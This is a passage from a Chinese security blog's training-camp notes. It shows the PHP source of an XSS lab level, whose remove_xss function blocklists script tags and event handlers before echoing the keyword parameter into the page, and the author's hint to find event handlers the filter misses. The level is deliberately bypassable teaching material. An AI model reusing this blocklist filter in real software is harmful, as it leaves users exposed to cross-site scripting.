+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span><span class="c">&lt;!--STATUS OK--&gt;</span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;content-type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html;charset=utf-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">alert</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>     
+</span></span><span class="line"><span class="cl"><span class="nx">confirm</span><span class="p">(</span><span class="s2">&#34;完成的不错！&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">//window.location.href=&#34;level10.php?keyword=well done!&#34;; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>欢迎来到level21<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>欢迎来到level21<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">function remove_xss($val) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // this prevents some character re-spacing such as &lt;java\0script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs
+</span></span></span><span class="line"><span class="cl"><span class="cp">//http://blog.qita.in
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $val = preg_replace(&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;, &#39;&#39;, $val);
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // straight replacements, the user should never need these since they&#39;re normal characters
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // this prevents like &lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $search = &#39;abcdefghijklmnopqrstuvwxyz&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $search .= &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $search .= &#39;1234567890!@#$%^&amp;*()&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $search .= &#39;~`&#34;;:?+/={}[]-_|\&#39;\\&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   for ($i = 0; $i &lt; strlen($search); $i++) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">      // ;? matches the ;, which is optional
+</span></span></span><span class="line"><span class="cl"><span class="cp">      // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">      // @ @ search for the hex values
+</span></span></span><span class="line"><span class="cl"><span class="cp">      $val = preg_replace(&#39;/(&amp;#[xX]0{0,8}&#39;.dechex(ord($search[$i])).&#39;;?)/i&#39;, $search[$i], $val); // with a ;
+</span></span></span><span class="line"><span class="cl"><span class="cp">      // @ @ 0{0,7} matches &#39;0&#39; zero to seven times
+</span></span></span><span class="line"><span class="cl"><span class="cp">      $val = preg_replace(&#39;/(�{0,8}&#39;.ord($search[$i]).&#39;;?)/&#39;, $search[$i], $val); // with a ;
+</span></span></span><span class="line"><span class="cl"><span class="cp">   }
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">   // now the only remaining whitespace attacks are \t, \n, and \r
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $ra1 = array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $ra2 = array(&#39;onabort&#39;, &#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterupdate&#39;, &#39;onbeforeactivate&#39;, &#39;onbeforecopy&#39;, &#39;onbeforecut&#39;, &#39;onbeforedeactivate&#39;, &#39;onbeforeeditfocus&#39;, &#39;onbeforepaste&#39;, &#39;onbeforeprint&#39;, &#39;onbeforeunload&#39;, &#39;onbeforeupdate&#39;, &#39;onblur&#39;, &#39;onbounce&#39;, &#39;oncellchange&#39;, &#39;onchange&#39;, &#39;onclick&#39;, &#39;oncontextmenu&#39;, &#39;oncontrolselect&#39;, &#39;oncopy&#39;, &#39;oncut&#39;, &#39;ondataavailable&#39;, &#39;ondatasetchanged&#39;, &#39;ondatasetcomplete&#39;, &#39;ondblclick&#39;, &#39;ondeactivate&#39;, &#39;ondrag&#39;, &#39;ondragend&#39;, &#39;ondragenter&#39;, &#39;ondragleave&#39;, &#39;ondragover&#39;, &#39;ondragstart&#39;, &#39;ondrop&#39;, &#39;onerror&#39;, &#39;onerrorupdate&#39;, &#39;onfilterchange&#39;, &#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;onfocusout&#39;, &#39;onhelp&#39;, &#39;onkeydown&#39;, &#39;onkeypress&#39;, &#39;onkeyup&#39;, &#39;onlayoutcomplete&#39;, &#39;onload&#39;, &#39;onlosecapture&#39;, &#39;onmousedown&#39;, &#39;onmouseenter&#39;, &#39;onmouseleave&#39;, &#39;onmousemove&#39;, &#39;onmouseout&#39;, &#39;onmouseover&#39;, &#39;onmouseup&#39;, &#39;onmousewheel&#39;, &#39;onmove&#39;, &#39;onmoveend&#39;, &#39;onmovestart&#39;, &#39;onpaste&#39;, &#39;onpropertychange&#39;, &#39;onreadystatechange&#39;, &#39;onreset&#39;, &#39;onresize&#39;, &#39;onresizeend&#39;, &#39;onresizestart&#39;, &#39;onrowenter&#39;, &#39;onrowexit&#39;, &#39;onrowsdelete&#39;, &#39;onrowsinserted&#39;, &#39;onscroll&#39;, &#39;onselect&#39;, &#39;onselectionchange&#39;, &#39;onselectstart&#39;, &#39;onstart&#39;, &#39;onstop&#39;, &#39;onsubmit&#39;, &#39;onunload&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $ra = array_merge($ra1, $ra2);
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">   $found = true; // keep replacing as long as the previous round replaced something
+</span></span></span><span class="line"><span class="cl"><span class="cp">   while ($found == true) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">      $val_before = $val;
+</span></span></span><span class="line"><span class="cl"><span class="cp">      for ($i = 0; $i &lt; sizeof($ra); $i++) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">         $pattern = &#39;/&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">         for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">            if ($j &gt; 0) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">               $pattern .= &#39;(&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">               $pattern .= &#39;(&amp;#[xX]0{0,8}([9ab]);)&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">               $pattern .= &#39;|&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">               $pattern .= &#39;|(�{0,8}([9|10|13]);)&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">               $pattern .= &#39;)*&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">            }
+</span></span></span><span class="line"><span class="cl"><span class="cp">            $pattern .= $ra[$i][$j];
+</span></span></span><span class="line"><span class="cl"><span class="cp">         }
+</span></span></span><span class="line"><span class="cl"><span class="cp">         $pattern .= &#39;/i&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">         $replacement = substr($ra[$i], 0, 2).&#39;&lt;x&gt;&#39;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag
+</span></span></span><span class="line"><span class="cl"><span class="cp">         $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags
+</span></span></span><span class="line"><span class="cl"><span class="cp">         if ($val_before == $val) {
+</span></span></span><span class="line"><span class="cl"><span class="cp">            // no replacements were made, so exit the loop
+</span></span></span><span class="line"><span class="cl"><span class="cp">            $found = false;
+</span></span></span><span class="line"><span class="cl"><span class="cp">         }
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }
+</span></span></span><span class="line"><span class="cl"><span class="cp">   }
+</span></span></span><span class="line"><span class="cl"><span class="cp">   return $val;
+</span></span></span><span class="line"><span class="cl"><span class="cp">}
+</span></span></span><span class="line"><span class="cl"><span class="cp">ini_set(&#34;display_errors&#34;, 0);
+</span></span></span><span class="line"><span class="cl"><span class="cp">$str = strtolower($_GET[&#34;keyword&#34;]);
+</span></span></span><span class="line"><span class="cl"><span class="cp">$str2=remove_xss($str);
+</span></span></span><span class="line"><span class="cl"><span class="cp">echo &#34;&lt;h2 align=center&gt;欢迎用户&#34;.$str2.&#34;&lt;/h2&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str2).&#34;&lt;/h3&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查找下没有被过滤的事件<a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener noreffer ">https://www.runoob.com/jsref/dom-obj-event.html</a></a><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1032" height="489" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-175.png" alt="" class="wp-image-2918" /></figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-08-19</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" data-title="2021年暑期夏令营笔记(day1-day3)" data-hashtags="Web安全"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" data-title="2021年暑期夏令营笔记(day1-day3)"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" data-title="2021年暑期夏令营笔记(day1-day3)"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/" data-title="2021年暑期夏令营笔记(day1-day3)"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/" class="prev" rel="prev" title="Android逆向学习小记(2)"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Android逆向学习小记(2)</a>
+            <a href="/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/" class="next" rel="next" title="2021年暑期夏令营笔记(day4-day5)">2021年暑期夏令营笔记(day4-day5)<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
